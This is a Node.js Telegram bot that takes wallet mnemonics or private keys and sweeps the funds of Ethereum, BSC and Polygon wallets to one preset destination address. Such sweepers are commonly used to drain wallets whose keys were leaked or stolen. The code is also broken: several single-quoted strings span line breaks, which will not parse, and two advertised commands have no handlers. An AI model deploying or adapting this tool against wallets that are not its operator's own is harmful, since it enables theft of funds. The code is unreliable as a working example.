require('dotenv').config();
const { Telegraf } = require('telegraf');
const { ethers } = require('ethers');
const bip39 = require('bip39');
const Sweeper = require('./sweeper');
const { encrypt, decrypt } = require('./utils');

const ADMIN_ID = parseInt(process.env.ADMIN_ID);
const bot = new Telegraf(process.env.BOT_TOKEN);

// Providers for different chains
const providers = {
  eth: new ethers.JsonRpcProvider(process.env.RPC_URL),
  bsc: new ethers.JsonRpcProvider(process.env.BSC_RPC),
  polygon: new ethers.JsonRpcProvider(process.env.POLYGON_RPC)
};

// Initialize sweepers
const sweepers = {};
for (const [chain, provider] of Object.entries(providers)) {
  sweepers[chain] = new Sweeper(provider, process.env.DESTINATION_WALLET);
}

// Middleware to check admin
const checkAdmin = (ctx, next) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.reply('❌ Admin only!');
  }
  return next();
};

// Store encrypted wallets (user_id -> {chain: mnemonic/private_key})
const wallets = {};

// Commands
bot.start((ctx) => ctx.reply(`
🔥 EVM Multi-Wallet Sweeper Bot
═══════════════════════════════
/add_wallet <chain> <mnemonic/private_key>
/list_wallets
/sweep_all <chain>
/sweep_single <chain> <wallet_index>
/balance <chain> <wallet_index>
/help
`, { parse_mode: 'HTML' }));

bot.command('add_wallet', checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 2) return ctx.reply('❌ Format: /add_wallet eth  your mnemonic or private_key');
  
  const [chain, key] = args;
  if (!providers[chain]) return ctx.reply('❌ Chain: eth, bsc, polygon');
  
  const encryptedKey = encrypt(key);
  const userId = ctx.from.id.toString();
  
  if (!wallets[userId]) wallets[userId] = {};
  wallets[userId][chain] = encryptedKey;
  
  ctx.reply(`✅ Added ${chain.toUpperCase()} wallet
🔒 Encrypted & stored safely`);
});

bot.command('list_wallets', checkAdmin, (ctx) => {
  const userId = ctx.from.id.toString();
  if (!wallets[userId]) return ctx.reply('❌ No wallets stored');
  
  let msg = '💼 Your Wallets:

';
  for (const [chain, _] of Object.entries(wallets[userId])) {
    msg += `• ${chain.toUpperCase()}
`;
  }
  ctx.reply(msg);
});

bot.command('sweep_all', checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  const chain = args[0];
  if (!chain || !providers[chain]) return ctx.reply('❌ /sweep_all eth');
  
  const userId = ctx.from.id.toString();
  if (!wallets[userId]?.[chain]) return ctx.reply('❌ No wallets for this chain');
  
  const encryptedKey = wallets[userId][chain];
  const privateKey = decrypt(encryptedKey);
  const wallet = new ethers.Wallet(privateKey, providers[chain]);
  
  ctx.reply('🔄 Starting sweep...');
  try {
    const result = await sweepers[chain].sweepWallet(privateKey);
    ctx.reply(`✅ Sweep Complete!

${JSON.stringify(result, null, 2)}`);
  } catch(e) {
    ctx.reply(`❌ Error: ${e.message}`);
  }
});

bot.command('help', (ctx) => {
  ctx.reply(`
📖 Commands:
/add_wallet eth "your mnemonic"
/list_wallets
/sweep_all eth
/sweep_single eth 0
/balance eth 0
   `);
});

bot.launch().then(() => {
  console.log('🤖 Bot started!');
}).catch(console.error);

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
